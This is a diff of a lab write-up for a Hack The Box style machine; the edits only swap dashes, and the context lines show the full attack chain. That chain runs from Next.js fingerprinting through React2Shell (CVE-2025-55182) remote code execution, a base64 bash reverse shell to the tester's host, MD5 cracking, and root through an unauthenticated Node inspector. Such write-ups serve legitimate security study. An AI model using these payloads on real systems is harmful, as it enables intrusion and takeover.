@@ -45,17 +45,17 @@ sudo nmap -p 22,3000 -sCV 10.129.91.79
 ...
 ```
 
-nmap doesn't cleanly fingerprint 3000, but the response leaks everything I need: `X-Powered-By: Next.js` plus a pile of `Next-Router-*` and `x-nextjs-*` headers. So it's a Next.js app on 3000. The OpenSSH version lines up with Ubuntu 24.04 Noble, and both ports show TTL 63 — Linux, one hop away.
+nmap doesn't cleanly fingerprint 3000, but the response leaks everything I need: `X-Powered-By: Next.js` plus a pile of `Next-Router-*` and `x-nextjs-*` headers. So it's a Next.js app on 3000. The OpenSSH version lines up with Ubuntu 24.04 Noble, and both ports show TTL 63 - Linux, one hop away.
 
 ---
 
-## 3. Enumeration — TCP 3000
+## 3. Enumeration - TCP 3000
 
 ### Site
-The site is a monitoring dashboard for a nuclear reactor. It's completely static — no links, no forms, no interaction. Guessing index paths (`/index`, `/index.html`) gets nowhere, which is expected for Next.js since routes are defined in code, not on the filesystem. The 404 page is the stock Next.js 404.
+The site is a monitoring dashboard for a nuclear reactor. It's completely static - no links, no forms, no interaction. Guessing index paths (`/index`, `/index.html`) gets nowhere, which is expected for Next.js since routes are defined in code, not on the filesystem. The 404 page is the stock Next.js 404.
 
 ### Directory brute force
-`feroxbuster` only turns up the framework's own JavaScript chunks under `/_next/static/` — nothing application-specific:
+`feroxbuster` only turns up the framework's own JavaScript chunks under `/_next/static/` - nothing application-specific:
 
 ```bash
 feroxbuster -u http://10.129.91.79:3000
@@ -69,7 +69,7 @@ feroxbuster -u http://10.129.91.79:3000
 ```
 
 ### Digging into the Next.js build
-There's no `__NEXT_DATA__` object in the HTML, which means this is an **App Router** app (not Pages Router), so there's no easy `buildManifest` to pull. First thing worth checking is whether source maps are exposed — they'd let me rebuild the original source:
+There's no `__NEXT_DATA__` object in the HTML, which means this is an **App Router** app (not Pages Router), so there's no easy `buildManifest` to pull. First thing worth checking is whether source maps are exposed - they'd let me rebuild the original source:
 
 ```bash
 for f in $(curl -s http://10.129.91.79:3000 | grep -oE '/_next/static/[^"\\]+\.js'); do
@@ -86,7 +86,7 @@ done
 npx js-beautify -r *.js
 ```
 
-The `webpack-*.js` chunk map (`.u` / `.miniCssF`) is empty, confirming there are no lazily-loaded routes — the one dashboard page is all there is. Not much to attack in the app itself, so the useful move is just to pull out version strings:
+The `webpack-*.js` chunk map (`.u` / `.miniCssF`) is empty, confirming there are no lazily-loaded routes - the one dashboard page is all there is. Not much to attack in the app itself, so the useful move is just to pull out version strings:
 
 ```bash
 grep -Eoi 'version\s?[:=]\s*"[^"]*"' *
@@ -99,15 +99,15 @@ polyfills-...js:version: "3.38.1"
 
 That's the whole fingerprint:
 
-- **Next.js 15.0.3** (the framework chunk stamps the exact build version — this is the server's version too, released mid-November 2024).
+- **Next.js 15.0.3** (the framework chunk stamps the exact build version - this is the server's version too, released mid-November 2024).
 - **React 19.0.0-rc** (build `66855b96`, 2024-11-06), the RC that Next 15.0.x pins.
 - **core-js 3.38.1** polyfills.
 
-An App Router app on React 19 RC means React Server Components are in play — and a 15.0.3 build is well over a year stale, so it's a good bet nobody has patched the framework.
+An App Router app on React 19 RC means React Server Components are in play - and a 15.0.3 build is well over a year stale, so it's a good bet nobody has patched the framework.
 
 ---
 
-## 4. Foothold — React2Shell (CVE-2025-55182)
+## 4. Foothold - React2Shell (CVE-2025-55182)
 
 ### The vulnerability
 Searching "next.js 15.0.3 vulnerabilities" surfaces **CVE-2025-55182**, aka **React2Shell** (Vercel tracks the downstream Next.js impact as CVE-2025-66478, a duplicate that points at the same flaw). NIST describes it as:
@@ -116,15 +116,15 @@ Searching "next.js 15.0.3 vulnerabilities" surfaces **CVE-2025-55182**, aka **Re
 
 Pre-auth RCE, CVSS 10.0. The target is running React 19.0.0, squarely in range.
 
-The bug is in the **Flight reply decoder** — Flight being React's wire format for Server Components, and the reply decoder being the half that parses data coming *from* the browser. By forging two internal React objects, you can confuse the decoder into compiling and calling an attacker-controlled function. The pieces:
+The bug is in the **Flight reply decoder** - Flight being React's wire format for Server Components, and the reply decoder being the half that parses data coming *from* the browser. By forging two internal React objects, you can confuse the decoder into compiling and calling an attacker-controlled function. The pieces:
 
 - The decoder passes around a `Response` object (`{ _bundlerConfig, _prefix, _formData, _chunks }`).
 - Each incoming field becomes a `Chunk` (`{ status, value, reason, _response }`).
-- A `$` in a value references another field; `:` walks its properties. So `"$4:constructor:constructor"` on a field holding `[]` means `Array.constructor` — the **Function constructor**.
+- A `$` in a value references another field; `:` walks its properties. So `"$4:constructor:constructor"` on a field holding `[]` means `Array.constructor` - the **Function constructor**.
 
-The exploit arranges for React to build a function via `Function(_prefix + id)` — where `_prefix` is my JavaScript and the trailing `id` is commented out with `//` — and then calls it by dressing a value up as both array-like and a thenable so React's `await` runs it. Only `_prefix` needs to change to control what runs.
+The exploit arranges for React to build a function via `Function(_prefix + id)` - where `_prefix` is my JavaScript and the trailing `id` is commented out with `//` - and then calls it by dressing a value up as both array-like and a thenable so React's `await` runs it. Only `_prefix` needs to change to control what runs.
 
-### POC — proving RCE
+### POC - proving RCE
 The Server Function endpoint reads the body as form data, so I write the numbered POC fields as a multipart body (`r2s-body.txt`), which keeps the payload out of URL encoding:
 
 ```text
@@ -155,7 +155,7 @@ Content-Disposition: form-data; name="5"
 ------R2S--
 ```
 
-The payload loads `child_process` and pings my host. It has to reach the module loader the long way — the function is built in global scope where there's no `require`, but `process` is a true global, so `process.mainModule.require` gets to the loader. I send it with a `Next-Action` header (the value is irrelevant; the decoder runs before React validates the action ID):
+The payload loads `child_process` and pings my host. It has to reach the module loader the long way - the function is built in global scope where there's no `require`, but `process` is a true global, so `process.mainModule.require` gets to the loader. I send it with a `Next-Action` header (the value is irrelevant; the decoder runs before React validates the action ID):
 
 ```bash
 curl --max-time 1 -X POST http://10.129.91.79:3000/ \
@@ -164,7 +164,7 @@ curl --max-time 1 -X POST http://10.129.91.79:3000/ \
   --data-binary @r2s-body.txt
 ```
 
-The request times out — expected, since the forged thenable never resolves and React waits forever — but `tcpdump` catches the ping:
+The request times out - expected, since the forged thenable never resolves and React waits forever - but `tcpdump` catches the ping:
 
 ```bash
 sudo tcpdump -ni tun0 icmp
@@ -176,7 +176,7 @@ IP 10.129.91.79 > 10.10.15.169: ICMP echo request ...
 RCE confirmed.
 
 ### Reverse shell
-I swap the `ping` for a base64-encoded bash reverse shell. base64 can emit `+` and `/`, and `+` decodes to a space if the body ever gets treated as URL-encoded form data — so I pad the command with extra spaces until the output is clean of both:
+I swap the `ping` for a base64-encoded bash reverse shell. base64 can emit `+` and `/`, and `+` decodes to a space if the body ever gets treated as URL-encoded form data - so I pad the command with extra spaces until the output is clean of both:
 
 ```bash
 echo 'bash  -i >& /dev/tcp/10.10.15.169/443 0>&1  ' | base64
@@ -212,10 +212,10 @@ stty raw -echo; fg
 
 ---
 
-## 5. Lateral Movement — engineer
+## 5. Lateral Movement - engineer
 
 ### Enumeration
-`node`'s home is empty and `sudo -l` wants a password I don't have. There's one other user with a home and a shell — `engineer`:
+`node`'s home is empty and `sudo -l` wants a password I don't have. There's one other user with a home and a shell - `engineer`:
 
 ```bash
 cat /etc/passwd | grep 'sh$'
@@ -232,7 +232,7 @@ ls /opt/reactor-app
 # app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
 ```
 
-`reactor.db` is odd — the site has no feature that would touch a database, and `package.json` lists no DB driver at all (just `next`, `react`, `react-dom`). Worth a look.
+`reactor.db` is odd - the site has no feature that would touch a database, and `package.json` lists no DB driver at all (just `next`, `react`, `react-dom`). Worth a look.
 
 ### The stray database
 ```bash
@@ -253,7 +253,7 @@ id|username|password_hash|role|email
 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
 ```
 
-Neither hash is used anywhere by the live site. They're 32 hex chars — MD5. Throwing both at CrackStation, only `engineer`'s cracks, to ||reactor1||.
+Neither hash is used anywhere by the live site. They're 32 hex chars - MD5. Throwing both at CrackStation, only `engineer`'s cracks, to ||reactor1||.
 
 ### su / SSH
 That's an application password, but `engineer` reused it for their system account, so it works with `su` and over SSH:
@@ -272,10 +272,10 @@ engineer@reactor:~$ cat user.txt
 
 ---
 
-## 6. Privilege Escalation — Node.js Inspector as root
+## 6. Privilege Escalation - Node.js Inspector as root
 
 ### Enumeration
-`engineer`'s home has a `.sudo_as_admin_successful` file (so they *used* to have sudo), but `sudo -l` now wants a password and sudo rights have been revoked. Back to `/opt/uptime-monitor`, which holds a single `worker.js`. It polls the website every 30 seconds and appends results to `/var/log/uptime-monitor.csv`. The code itself has nothing exploitable — but how it's *run* does:
+`engineer`'s home has a `.sudo_as_admin_successful` file (so they *used* to have sudo), but `sudo -l` now wants a password and sudo rights have been revoked. Back to `/opt/uptime-monitor`, which holds a single `worker.js`. It polls the website every 30 seconds and appends results to `/var/log/uptime-monitor.csv`. The code itself has nothing exploitable - but how it's *run* does:
 
 ```bash
 ps auxww | grep worker.js
@@ -292,7 +292,7 @@ netstat -tnlp
 ```
 
 ### Why this is game over
-`--inspect` opens Node's Inspector — the V8 debugger — speaking the Chrome DevTools Protocol over a WebSocket. CDP includes `Runtime.evaluate`, which runs arbitrary JavaScript inside the target process. **There's no authentication.** The only thing protecting it is the localhost bind, so anyone who can reach port 9229 runs code inside a root process.
+`--inspect` opens Node's Inspector - the V8 debugger - speaking the Chrome DevTools Protocol over a WebSocket. CDP includes `Runtime.evaluate`, which runs arbitrary JavaScript inside the target process. **There's no authentication.** The only thing protecting it is the localhost bind, so anyone who can reach port 9229 runs code inside a root process.
 
 Enumerate the available target:
 
@@ -308,7 +308,7 @@ curl localhost:9229/json/list
 ```
 
 ### Root via the node CLI client
-Simplest path — attach with Node's own `node inspect` client and evaluate code. This works straight from the `node` shell too, so `engineer` isn't even strictly required:
+Simplest path - attach with Node's own `node inspect` client and evaluate code. This works straight from the `node` shell too, so `engineer` isn't even strictly required:
 
 ```bash
 node inspect 127.0.0.1:9229
@@ -352,8 +352,8 @@ root@reactor:~# cat root.txt
 ## 8. Summary
 Reactor is a clean modern-web chain:
 
-- **Know your framework fingerprints.** A couple of version strings grepped out of the Next.js chunks (Next 15.0.3 + React 19.0.0-rc) were enough to identify a pre-auth RCE with zero site interaction. React2Shell (CVE-2025-55182) abuses unsafe deserialization in the RSC Flight decoder — forging internal objects to reach the Function constructor and run code before any auth check.
+- **Know your framework fingerprints.** A couple of version strings grepped out of the Next.js chunks (Next 15.0.3 + React 19.0.0-rc) were enough to identify a pre-auth RCE with zero site interaction. React2Shell (CVE-2025-55182) abuses unsafe deserialization in the RSC Flight decoder - forging internal objects to reach the Function constructor and run code before any auth check.
 - **Loot everything, even unused files.** The site never touched `reactor.db`, but it held a reusable MD5 password for `engineer`.
-- **A debugger is an RCE primitive.** `node --inspect` with no auth, running as root, is arbitrary code execution for anyone who can reach the port — localhost binding is not a security control when local users exist.
+- **A debugger is an RCE primitive.** `node --inspect` with no auth, running as root, is arbitrary code execution for anyone who can reach the port - localhost binding is not a security control when local users exist.
 
 **Tools used:** `nmap`, `feroxbuster`, `curl`, `js-beautify`, `tcpdump`, `nc`, `sqlite3`, CrackStation, `sshpass`, `node inspect`.
